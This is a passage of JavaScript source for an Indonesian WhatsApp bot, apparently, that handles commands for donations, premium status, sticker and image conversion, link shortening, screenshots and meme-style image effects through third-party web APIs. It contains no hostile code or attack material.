			    reply(`──「 MENU DONATE 」──\n\nHi ${pushname} 👋🏻\n\`\`\`Dana : ${setting.donasi.dana}\nA/N : ${setting.donasi.AN_dana}\`\`\`\n\`\`\`Gopay : ${setting.donasi.gopay}\nA/N : ${setting.donasi.AN_gopay}\`\`\`\n\nTerimakasih untuk kamu yang sudah donasi untuk perkembangan bot ini _^`)
			    break
			case prefix+'owner':
			    addCountCmd('#owner', sender, _cmd)
			    for (let x of ownerNumber) {
			     let haik = await sendContact(from, x.split('@s.whatsapp.net')[0], 'Satganz Devs', msg)
			    }
			    break
            case prefix+'dashboard':
                   addCountCmd('#dashboard', sender, _cmd)
                   var posi = await getPosiCmdUser(sender, _cmdUser)
                   _cmdUser[posi].db.sort((a, b) => (a.count < b.count) ? 1 : -1)
                   _cmd.sort((a, b) => (a.count  < b.count) ? 1 : -1)
                   var posi = await getPosiCmdUser(sender, _cmdUser)
                   var jumlahCmd = _cmd.length
                   if (jumlahCmd > 10) jumlahCmd = 10
                   var jumlah = _cmdUser[posi].db.length
                   if (jumlah > 5) jumlah = 5
                   var totalUser = 0
                   for (let x of _cmdUser[posi].db) {
                     totalUser = totalUser + x.count
                   }
                   var total = 0
                   for (let o of _cmd) {
                     total = total + o.count
                   }
                   var teks = `*${setting.botName} Dashboard*\n\n*HIT*\n• GLOBAL : ${total}\n• USER : ${totalUser}\n\n`
                   teks += `*Most Command Global*\n`
                   for (let u = 0; u < jumlahCmd; u ++) {
                     teks += `• ${_cmd[u].nama} : ${_cmd[u].count}\n`
                   }
                   teks += `\n*Most Command User*\n`
                   for (let i = 0; i < jumlah; i ++) {
                     teks += `• ${_cmdUser[posi].db[i].nama} : ${_cmdUser[posi].db[i].count}\n`
                   }
                   reply(teks)
                   break
			case prefix+'cekprem':
            case prefix+'cekpremium':
                if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`)
                if (isOwner) return reply(`Lu owner bego!`)
                if (_prem.getPremiumExpired(sender, premium) == "PERMANENT") return reply(`PERMANENT`)
                addCountCmd('#cekpremium', sender, _cmd)
                let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                let premiumnya = `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
                reply(premiumnya)
                break
            case prefix+'listprem':
            case prefix+'listpremium':
                addCountCmd('#listpremium', sender, _cmd)
                let txt = `List Prem\nJumlah : ${premium.length}\n\n`
                let men = [];
                for (let i of premium) {
                    men.push(i.id)
                    txt += `*ID :* @${i.id.split("@")[0]}\n`
                  if (i.expired === 'PERMANENT') {
                    let cekvip = 'PERMANENT'
                    txt += `*Expire :* PERMANENT\n\n`
                  } else {
                    let cekvip = ms(i.expired - Date.now())
                    txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
                  }
                }
                mentions(txt, men, true)
                break
	        // Converter & Tools Menu
			case prefix+'sticker': case prefix+'stiker': case prefix+'s':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (isImage || isQuotedImage) {
					addCountCmd('#sticker', sender, _cmd)
		           var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
			       var buffer = Buffer.from([])
			       for await(const chunk of stream) {
			          buffer = Buffer.concat([buffer, chunk])
			       }
			       var rand1 = 'sticker/'+getRandom('.jpg')
			       var rand2 = 'sticker/'+getRandom('.webp')
			       fs.writeFileSync(`./${rand1}`, buffer)
			       ffmpeg(`./${rand1}`)
				.on("error", console.error)
				.on("end", () => {
				  exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
				    conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
				    limitAdd(sender, limit)
					fs.unlinkSync(`./${rand1}`)
			            fs.unlinkSync(`./${rand2}`)
			          })
				 })
				.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
				.toFormat('webp')
				.save(`${rand2}`)
			    } else if (isVideo || isQuotedVideo) {
				addCountCmd('#sticker', sender, _cmd)
				 var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
				 var buffer = Buffer.from([])
				 for await(const chunk of stream) {
				   buffer = Buffer.concat([buffer, chunk])
				 }
			     var rand1 = 'sticker/'+getRandom('.mp4')
				 var rand2 = 'sticker/'+getRandom('.webp')
			         fs.writeFileSync(`./${rand1}`, buffer)
			         ffmpeg(`./${rand1}`)
				  .on("error", console.error)
				  .on("end", () => {
				    exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
				      conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
				      limitAdd(sender, limit)
					  fs.unlinkSync(`./${rand1}`)
				      fs.unlinkSync(`./${rand2}`)
				    })
				  })
				 .addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
				 .toFormat('webp')
				 .save(`${rand2}`)
                } else {
			       reply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
			    }
                break
			case prefix+'toimg': case prefix+'toimage':
			case prefix+'tovid': case prefix+'tovideo':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (!isQuotedSticker) return reply(`Reply stikernya!`)
			    addCountCmd('#toimage', sender, _cmd)
			    var stream = await downloadContentFromMessage(msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
			    var buffer = Buffer.from([])
			    for await(const chunk of stream) {
			       buffer = Buffer.concat([buffer, chunk])
			    }
			    var rand1 = 'sticker/'+getRandom('.webp')
			    var rand2 = 'sticker/'+getRandom('.png')
			    fs.writeFileSync(`./${rand1}`, buffer)
			    if (isQuotedSticker && msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated !== true) {
			    exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
			      fs.unlinkSync(`./${rand1}`)
			      if (err) return reply("Maaf terjadi kesalahan")
			      conn.sendMessage(from, { image: { url: `./${rand2}` }}, { quoted: msg })
			      limitAdd(sender, limit)
				  fs.unlinkSync(`./${rand2}`)
			    })
			    } else {
			    reply("_Wait a minute, data is being processed!_")
		          webp2mp4File(`./${rand1}`).then( data => {
			       fs.unlinkSync(`./${rand1}`)
			       conn.sendMessage(from, { video: { url: data.result }}, { quoted: msg })
			       limitAdd(sender, limit)
				  })
			    }
			    break
            case prefix+'upload': case prefix+'tourl': case prefix+'tolink':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else if (isVideo || isQuotedVideo) {
                     var fileName = 'video'+makeid(10)+'.mp4'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${fileName}`)
                   } else if (isQuotedAudio) {
                     var fileName = 'audio'+makeid(10)+'.mp3'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto/Video/Audio yang ingin dijadikan url dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#upload', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var teks = `*UPLOAD SUCCES*\n\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${size}`
                     reply(teks)
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
            case prefix+'ssweb-desktop':
                  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                  if (args.length < 2) return reply(`Kirim perintah ${command} https://github.com/riy04`)
                  if (!isUrl(args[1])) return reply(mess.error.Iv)
                  addCountCmd('#ssweb-desktop', sender, _cmd)
                  reply("_Wait a minute, data is being processed!_")
                  var fatih = `https://fatiharridho.herokuapp.com/api/tools/ssweb?url=${q}&device=dekstop`
                  conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: fatih }}, { quoted: msg})
                  limitAdd(sender, limit)
                  break
            case prefix+'ssweb-tablet':
                  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                  if (args.length < 2) return reply(`Kirim perintah ${command} https://github.com/riy04`)
                  if (!isUrl(args[1])) return reply(mess.error.Iv)
                  addCountCmd('#ssweb-tablet', sender, _cmd)
                  reply("_Wait a minute, data is being processed!_")
                  var fatih = `https://fatiharridho.herokuapp.com/api/tools/ssweb?url=${q}&device=tablet`
                  conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: fatih }}, { quoted: msg})
                  limitAdd(sender, limit)
                  break
            case prefix+'ssweb-phone':
                  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                  if (args.length < 2) return reply(`Kirim perintah ${command} https://github.com/riy04`)
                  if (!isUrl(args[1])) return reply(mess.error.Iv)
                  addCountCmd('#ssweb-phone', sender, _cmd)
                  reply("_Wait a minute, data is being processed!_")
                  var fatih = `https://fatiharridho.herokuapp.com/api/tools/ssweb?url=${q}&device=phone`
                  conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: fatih }}, { quoted: msg})
                  limitAdd(sender, limit)
                  break
            case prefix+'tinyurl':
                  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                  if (args.length < 2) return reply(`Kirim perintah ${command} https://youtube.com/c/Riy04`)
                  if (!isUrl(args[1])) return reply(mess.error.Iv)
                  addCountCmd('#tinyurl', sender, _cmd)
                  reply("_Wait a minute, data is being processed!_")
                  var riy = await fetchJson(`https://rest-api-riy.herokuapp.com/api/linkshort/tinyurl?link=${q}`)
                  var teks = `*DONE*\n\n≻ Url Original : ${q}\n≻ Result : ${riy.result}`
                  conn.sendMessage(from, { text: teks }, { quoted: msg })
                  limitAdd(sender, limit)
                  break
            case prefix+'cuttly':
                  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                  if (args.length < 2) return reply(`Kirim perintah ${command} https://youtube.com/c/Riy04`)
                  if (!isUrl(args[1])) return reply(mess.error.Iv)
                  addCountCmd('#cuttly', sender, _cmd)
                  reply("_Wait a minute, data is being processed!_")
                  var riy = await fetchJson(`https://rest-api-riy.herokuapp.com/api/linkshort/cuttly?link=${q}`)
                  var teks = `*DONE*\n\n≻ Url Original : ${q}\n≻ Result : ${riy.result}`
                  conn.sendMessage(from, { text: teks }, { quoted: msg })
                  limitAdd(sender, limit)
                  break
            case prefix+'bitly':
                  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                  if (args.length < 2) return reply(`Kirim perintah ${command} https://youtube.com/c/Riy04`)
                  if (!isUrl(args[1])) return reply(mess.error.Iv)
                  addCountCmd('#bitly', sender, _cmd)
                  reply("_Wait a minute, data is being processed!_")
                  var riy = await fetchJson(`https://rest-api-riy.herokuapp.com/api/linkshort/bitly?link=${q}`)
                  var teks = `*DONE*\n\n≻ Url Original : ${q}\n≻ Result : ${riy.result}`
                  conn.sendMessage(from, { text: teks }, { quoted: msg })
                  limitAdd(sender, limit)
                  break
            // Image Edit Menu
            case prefix+'circle':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#circle', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://rest-api-riy.herokuapp.com/api/maker/circle?url=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
            case prefix+'beautiful':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#beautiful', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://rest-api-riy.herokuapp.com/api/maker/beautiful?url=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
            case prefix+'blur':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#blur', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://rest-api-riy.herokuapp.com/api/maker/blur?url=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
            case prefix+'darkness':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#darkness', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://rest-api-riy.herokuapp.com/api/maker/darkness?url=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
            case prefix+'facepalm':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#facepalm', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://rest-api-riy.herokuapp.com/api/maker/facepalm?url=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
            case prefix+'invert':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#invert', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://rest-api-riy.herokuapp.com/api/invert/beautiful?url=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
            case prefix+'pixelate':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#pixelate', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://rest-api-riy.herokuapp.com/api/pixelate/beautiful?url=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
            case prefix+'rainbow':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#rainbow', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://rest-api-riy.herokuapp.com/api/pixelate/rainbow?url=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
            case prefix+'wanted':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#wanted', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://rest-api-riy.herokuapp.com/api/maker/wanted?url=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
             case prefix+'spongebob':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#spongebob', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://fatiharridho.herokuapp.com/api/canvas/spongebob?bg=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
             case prefix+'patrick':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto dengan caption ${command}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#patrick', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://fatiharridho.herokuapp.com/api/canvas/patrick?bg=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
             case prefix+'instagram-profile':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim atau balas Sticker/Foto dengan caption ${command} username|postingan|follower|following\n\n*Contoh : ${command} riychdwayne|999|999|99999|99*`)
                   if (!q.includes('|')) return reply(`Format salah, contoh pemakaian ${command} riychdwayne|999|999|99999|99`)
                   var tek1 = q.split('|')[0]
                   var tek2 = q.split('|')[1]
                   var tek3 = q.split('|')[1]
                   var tek4 = q.split('|')[1]
                   if (tek1.length > 5) return reply(`Teks 1 kepanjangan`)
                   if (tek2.length > 5) return reply(`Teks 2 kepanjangan`)
                   if (tek3.length > 5) return reply(`Teks 3 kepanjangan`)
                   if (tek4.length > 5) return reply(`Teks 3 kepanjangan`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#instagram-profile', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://fatiharridho.herokuapp.com/api/canvas/instagram?pp=${url}&username=${tek1}&post=${tek2}&followers=${tek3}&following=${tek4}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
             case prefix+'xnxx-profile':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim atau balas Sticker/Foto dengan caption ${command} Riy 04`)
                   if (q.length > 10) return reply(`Teksnya kebanyakan`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#xnxx-profile', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://fatiharridho.herokuapp.com/api/canvas/xnxx?pp=${url}&username=${q}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
             case prefix+'gura':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 5) return reply(`Teksnya kebanyakan`)
                addCountCmd('#gura', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var fatih = `https://fatiharridho.herokuapp.com/api/canvas/gura?text=${q}`
